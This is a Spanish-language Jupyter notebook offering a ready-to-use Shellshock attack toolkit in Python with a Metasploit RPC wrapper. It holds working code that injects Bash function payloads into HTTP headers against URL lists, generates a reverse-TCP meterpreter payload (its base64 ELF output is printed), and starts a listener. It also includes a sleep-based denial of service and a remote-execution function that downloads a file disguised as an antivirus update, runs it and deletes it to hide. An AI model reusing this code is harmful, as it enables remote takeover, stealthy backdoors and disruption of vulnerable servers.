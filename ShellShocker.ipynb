{
 "metadata": {
  "name": "",
  "signature": "sha256:37700d422d945074254272e16cc904f2a0534dd9df145d4942863173186149e1"
 },
 "nbformat": 3,
 "nbformat_minor": 0,
 "worksheets": [
  {
   "cells": [
    {
     "cell_type": "heading",
     "level": 1,
     "metadata": {},
     "source": [
      "Shellshocking with python & Metasploit"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "<a name=\"0\"><h2>\u00cdndice</h2></a><br>\n",
      "<a href=\"#1.\"> **1. Shellshock**</a><br>\n",
      "<a href=\"#2.\">**2. Atacando con metasploit**</a><br>\n",
      "<a href=\"#2.1\">2.1 Preparando el servidor de escucha</a><br>\n",
      "<a href=\"#2.2\">2.2  Generando el payload de reverse meterpreter</a><br>\n",
      "<a href=\"#3.\">**3. Probando diferentes ataques**</a><br>\n",
      "<a href=\"#3.1\">3.1 DOS</a><br>\n",
      "<a href=\"#3.2\">3.2 Remote file execution</a><br>\n",
      "<a href=\"#4.\">**4. Ap\u00e9ndice**</a><br>"
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "<a name=\"1.\">1.</a> Shellshock"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "ShellShock es una vulnerabilidad en la interfaz de comandos BASH conocida como <a href=\"http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169\">CVE-2014-6271</a> y <a href=\"http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-7169\">CVE-2014-7169</a>. Bas\u00e1ndonos en el post sobre la vulnerabilidad de <a href='http://www.elladodelmal.com/2014/09/shellshock-puede-afectar-tu-web-tu.html'>Un inform\u00e1tico en el lado del mal</a> y el post de<a href='https://www.fireeye.com/blog/threat-research/2014/09/shellshock-in-the-wild.html'> FireEye </a> hemos desarrollado una serie de funciones que nos permitir\u00e1n ejecutar algunas variantes de este ataque de forma r\u00e1pida y f\u00e1cil desde python."
     ]
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "<a name=\"2.\">2.</a> Atacando con metasploit"
     ]
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "<a name=\"2.1\">2.1</a> Preparando el servidor de escucha"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Es posible utilizar este framework para generar un payload que establecer\u00e1 una conexi\u00f3n de tcp contra un servidor local que estar\u00e1 esperando conexiones en el puerto que le indiquemos. Tenemos dos formas de preparar el servidor:"
     ]
    },
    {
     "cell_type": "heading",
     "level": 4,
     "metadata": {},
     "source": [
      "Introduce los siguientes comandos en la consola de msf"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "- use exploit/multi/handler\n",
      "- set payload linux/x86/meterpreter/reverse_tcp\n",
      "- set lhost 192.168.56.101\n",
      "- set lport 4444\n",
      "- exploit"
     ]
    },
    {
     "cell_type": "heading",
     "level": 4,
     "metadata": {},
     "source": [
      "Desde python"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Ejecuta en una consola de msf el comando:\n",
      "    \n",
      "    load msgrpc Pass=miau User=admin\n",
      "\n",
      "De esta manera ejecutaras el plugin msgrpc en el puerto 55552 con las credenciasles indicadas. Desde python nos podremos conectar a \u00e9l ejecutando la siguiente celta:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import metasploit_interface as msi\n",
      "handler_cli,handler_cons=msi.meterpreter_handler(LPORT='4499')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "                          ########                  #\n",
        "                      #################            #\n",
        "                   ######################         #\n",
        "                  #########################      #\n",
        "                ############################\n",
        "               ##############################\n",
        "               ###############################\n",
        "              ###############################\n",
        "              ##############################\n",
        "                              #    ########   #\n",
        "                 ##        ###        ####   ##\n",
        "                                      ###   ###\n",
        "                                    ####   ###\n",
        "               ####          ##########   ####\n",
        "               #######################   ####\n",
        "                 ####################   ####\n",
        "                  ##################  ####\n",
        "                    ############      ##\n",
        "                       ########        ###\n",
        "                      #########        #####\n",
        "                    ############      ######\n",
        "                   ########      #########\n",
        "                     #####       ########\n",
        "                       ###       #########\n",
        "                      ######    ############\n",
        "                     #######################\n",
        "                     #   #   ###  #   #   ##\n",
        "                     ########################\n",
        "                      ##     ##   ##     ##\n",
        "                            http://metasploit.pro\n",
        "\n",
        "\n",
        "       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]\n",
        "+ -- --=[ 1387 exploits - 781 auxiliary - 223 post        ]\n",
        "+ -- --=[ 356 payloads - 37 encoders - 8 nops             ]\n",
        "+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\n",
        "\n",
        "\n",
        "use exploit/multi/handler\n",
        "set payload linux/x86/meterpreter/reverse_tcp\n",
        "set LHOST 192.168.1.164\n",
        "set LPORT 4499\n",
        "exploit\n"
       ]
      }
     ],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "read_console(handler_cli,handler_cons)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "LHOST => 192.168.1.164\n",
        "LPORT => 4499\n",
        "payload => linux/x86/meterpreter/reverse_tcp\n",
        "[*] Started reverse handler on 192.168.1.164:4499 \n",
        "[*] Starting the payload handler...\n",
        "\n",
        "\n",
        "\n",
        "\n",
        "\n"
       ]
      }
     ],
     "prompt_number": 8
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Ahora ser\u00e1 posible utilizar la consola de metasploit desde python y se habr\u00e1n ejecutado en ella los comandos necesarios para poner el servidor a la escucha."
     ]
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "<a name=\"2.2\">2.2</a> Generando el payload de reverse meterpreter "
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Una vez iniciado el plugin msfrpc, es posible crear el payload necesario para obtener una conexi\u00f3n desde la que controlar remotamente a nuestra v\u00edctima con el siguiente comando:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "payload=reverse_tcp_payload(LPORT='4444',user='admin',password='miau')"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        " ______________________________________________________________________________\n",
        "|                                                                              |\n",
        "|                   METASPLOIT CYBER MISSILE COMMAND V4                        |\n",
        "|______________________________________________________________________________|\n",
        "      \\                                  /                      /\n",
        "       \\     .                          /                      /            x\n",
        "        \\                              /                      /\n",
        "         \\                            /          +           /\n",
        "          \\            +             /                      /\n",
        "           *                        /                      /\n",
        "                                   /      .               /\n",
        "    X                             /                      /            X\n",
        "                                 /                     ###\n",
        "                                /                     # % #\n",
        "                               /                       ###\n",
        "                      .       /\n",
        "     .                       /      .            *           .\n",
        "                            /\n",
        "                           *\n",
        "                  +                       *\n",
        "\n",
        "                                       ^\n",
        "####      __     __     __          #######         __     __     __        ####\n",
        "####    /    \\ /    \\ /    \\      ###########     /    \\ /    \\ /    \\      ####\n",
        "################################################################################\n",
        "################################################################################\n",
        "# WAVE 4 ######## SCORE 31337 ################################## HIGH FFFFFFFF #\n",
        "################################################################################\n",
        "                                                           http://metasploit.pro\n",
        "\n",
        "\n",
        "       =[ metasploit v4.11.0-dev [core:4.11.0.pre.dev api:1.0.0]]\n",
        "+ -- --=[ 1387 exploits - 781 auxiliary - 223 post        ]\n",
        "+ -- --=[ 356 payloads - 37 encoders - 8 nops             ]\n",
        "+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\n",
        "\n",
        "\n",
        "[*] exec: msfpayload linux/x86/meterpreter/reverse_tcp lhost=192.168.1.164 lport=4444 X > p1.bin && chmod 755 p1.bin && cat p1.bin | base64\n",
        "\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n"
       ]
      },
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "\n",
        "Payload succesfully generated:  f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA\n",
        "AAAAAIAECACABAibAAAA4gAAAAcAAAAAEAAAMdv341NDU2oCsGaJ4c2Al1towKgBpGgCABFcieFq\n",
        "ZlhQUVeJ4UPNgLIHuQAQAACJ48HrDMHjDLB9zYBbieGZtgywA82A/+E=\n"
       ]
      }
     ],
     "prompt_number": 11
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Ahora solo queda lanzar el ataque contra nuestra v\u00edctima. Para ello introduciremos una lista de URLS vulnerables a las que atacar:"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "URLs=['http://example.com']\n",
      "responses=shellshock(URLs,payload)"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 14
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Las peticiones a las URLs vulnerables se ejecutan utilizando Urllib3, por lo que la funci\u00f3n retornar\u00e1 una lista de responses a las peticiones realizadas."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "responses[0].status"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 16,
       "text": [
        "400"
       ]
      }
     ],
     "prompt_number": 16
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "<a name=\"3.\">3.</a> Probando diferentes ataques"
     ]
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "<a name=\"3.1\">3.1</a> DOS"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Es posible ejecutar una denegaci\u00f3n de servicio poniendo a dormir el ordenador vulnerable. Al ejecutar el siguiente comando el ordenador atacado se detendr\u00e1 durante *time* segundos."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "responses=shellshock(['http://example.com'],DOS())\n",
      "responses[0].status"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 18,
       "text": [
        "200"
       ]
      }
     ],
     "prompt_number": 18
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "<a name=\"3.2\">3.2</a> Remote file execution"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Esta variante del ataque permite descargar en la v\u00edctima el archivo ubicado en *URL_file* haci\u00e9ndolo pasar por una actualizaci\u00f3n de antivirus y posteriormente borrarlo para que se quede ejecut\u00e1ndose en memoria."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "URL_file='URL de nuestro recurso'\n",
      "URLs_vulnerables=['http://example.com']\n",
      "responses=shellshock(URLs_vulnerables,remote_file_execution(URL_file))\n",
      "responses[0].status"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 20,
       "text": [
        "200"
       ]
      }
     ],
     "prompt_number": 20
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "<a name=\"4.\">4.</a> Ap\u00e9ndice"
     ]
    },
    {
     "cell_type": "heading",
     "level": 4,
     "metadata": {},
     "source": [
      "Exploit ShellShock"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import urllib3\n",
      "\n",
      "def DOS(time=20):\n",
      "    return '/bin/sleep'+ str(time)\n",
      "\n",
      "def remote_file_execution(URL):\n",
      "    \"\"\"ejecuta el archivo ubicado en URL y lo ejecuta como una actualizacion el antivirus. Despues lo bora y deja el programa ejecutandose en memoria\"\"\"\n",
      "    return' /bin/bash -c \\\"/usr/bin/env curl -s'+URL+' > /tmp/clamd_update; chmod +x /tmp/clamd_update; /tmp/clamd_update > /dev/null& sleep 5; rm -rf /tmp/clamd_update\\\"'\n",
      "\n",
      "def shellshock_one(pool,URL,payload,param='content-type'):\n",
      "    res=pool.request(\"GET\",URL,headers = {param :'() { :;};'+ payload })\n",
      "    return res\n",
      "\n",
      "def shellshock(URLs,payload):\n",
      "  pool=urllib3.PoolManager(len(URLs))\n",
      "  reslist=[]  \n",
      "  for url in URLs:\n",
      "     reslist.append(shellshock_one(pool,url,payload))\n",
      "  return reslist      \n",
      "\n",
      "def lips_to_URL(lips):\n",
      "    return  ['http://'+ip for ip in lips] \n",
      "\n",
      "def restore_console(client,console):    \n",
      "    readedData=client.call('console.session_kill',[console['id']])    \n",
      "    return init_console()\n",
      "\n",
      "def read_console(client,console,n=5):\n",
      "    for i in range(n):\n",
      "     print client.call('console.read',[console['id']])['data'] \n",
      "        \n",
      "def new_console(client):        \n",
      "    try:\n",
      "        return client.call('console.create',[])\n",
      "    except:\n",
      "        print \"Error creando la nueva consola\"\n",
      "        \n",
      "def reverse_tcp_payload(LHOST=None,LPORT='4444',user='admin',password='pene',port='55552',host='127.0.0.1'):\n",
      "    payload=msi.create_shellshock_payload(LPORT=LPORT,LHOST=LHOST,user=user,password=password,port=port,host=host)\n",
      "    return payload+' > /tmp/p2.bin && echo;/usr/bin/base64 -d /tmp/p2.bin > /tmp/p1.bin'        "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 21
    },
    {
     "cell_type": "heading",
     "level": 4,
     "metadata": {},
     "source": [
      "Interfaz Metasploit"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%file metasploit_interface.py\n",
      "import msfrpc\n",
      "import msgpack\n",
      "from netifaces import interfaces, ifaddresses, AF_INET\n",
      "import time\n",
      "\n",
      "def get_current_IP():\n",
      "  for ifaceName in interfaces():\n",
      "    addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]\n",
      "    #print '%s: %s' % (ifaceName, ', '.join(addresses))\n",
      "  return addresses[0] \n",
      "\n",
      "def init_console(user='admin',password='miau',port='55552',host='127.0.0.1'):\n",
      "  client = msfrpc.Msfrpc({'port':port,'host':host})\n",
      "  auth =client.login(user,password)\n",
      "  if auth:\n",
      "    console=client.call('console.create',[])\n",
      "    return client,console\n",
      "  else:\n",
      "    print \"Error\"\n",
      "    \n",
      "def print_console(client,console):\n",
      "  while True:\n",
      "   readedData=client.call('console.read',[console['id']])   \n",
      "   if len(readedData['data'])>1:\n",
      "      #readedData=readedData['data']\n",
      "      print readedData['data']      \n",
      "   if readedData['busy']==True:\n",
      "        print readedData['data']        \n",
      "        time.sleep(1)\n",
      "        continue\n",
      "   break      \n",
      "        \n",
      "def payload_shellshock(client,console,LPORT='4444',LHOST='192.168.1.1'):\n",
      "    print_console(client,console)\n",
      "    cmd='msfpayload linux/x86/meterpreter/reverse_tcp lhost='+str(LHOST)+' lport='+LPORT+' X > p1.bin && chmod 755 p1.bin && cat p1.bin | base64'\n",
      "    client.call('console.write',[console['id'],cmd+'\\n'])\n",
      "    while True:\n",
      "      readedData=client.call('console.read',[console['id']])\n",
      "      if readedData['busy']==True:\n",
      "        time.sleep(1)\n",
      "        print readedData['data']   \n",
      "        continue\n",
      "      payload=readedData['data'][:-1]\n",
      "    #client.call('console.destroy',[console['id']])\n",
      "      return payload\n",
      "    \n",
      "def create_shellshock_payload(LPORT='4444',LHOST=None,user='admin',password='miau',port='55552',host='127.0.0.1'):\n",
      "    if str(LHOST)=='None':\n",
      "        LHOST=get_current_IP()\n",
      "    client0,console0=init_console(user,password,port,host)\n",
      "    payload=payload_shellshock(client0,console0,LPORT=LPORT,LHOST=LHOST)\n",
      "    print \"Payload succesfully generated: \",payload\n",
      "    client0.call('console.destroy',[console0['id']])\n",
      "    return payload\n",
      "\n",
      "def meterpreter_handler(LPORT='4444',user='admin',password='miau',port='55552',host='127.0.0.1'):\n",
      "    client0,console0=init_console(user,password,port,host)\n",
      "    print_console(client0,console0)    \n",
      "    cmd='use exploit/multi/handler'\n",
      "    cmd2='set payload linux/x86/meterpreter/reverse_tcp'\n",
      "    cmd3='set LHOST '+get_current_IP()\n",
      "    cmd4='set LPORT '+LPORT\n",
      "    cmd5='exploit'\n",
      "    comands=[cmd,cmd2,cmd3,cmd4,cmd5]\n",
      "    msf_comands(comands,client0,console0)\n",
      "    return client0,console0\n",
      "\n",
      "def msf_comands(comands,client,console):\n",
      "  for cmd in comands:  \n",
      "    client.call('console.write',[console['id'],cmd+'\\n'])\n",
      "    print cmd\n",
      "    i=0\n",
      "    while i<20:\n",
      "      readedData=client.call('console.read',[console['id']]) \n",
      "      if readedData['busy']==True:\n",
      "        time.sleep(1)\n",
      "        i+=1\n",
      "        print readedData['data'],i   \n",
      "        continue         \n",
      "      break  \n",
      "            \n",
      "def restore_console(client,console):    \n",
      "    readedData=client.call('console.session_kill',[console['id']])    \n",
      "    return init_console()\n",
      "\n",
      "def read_console(client,console,n=5):\n",
      "    for i in range(n):\n",
      "     print client.call('console.read',[console['id']])['data'] \n",
      "        \n",
      "def new_console(client):        \n",
      "    try:\n",
      "        return client.call('console.create',[])\n",
      "    except:\n",
      "        print \"Error creando la nueva consola\"\n",
      "        "
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "Overwriting metasploit_interface.py\n"
       ]
      }
     ],
     "prompt_number": 2
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": [],
     "prompt_number": 7
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [],
     "language": "python",
     "metadata": {},
     "outputs": []
    }
   ],
   "metadata": {}
  }
 ]
}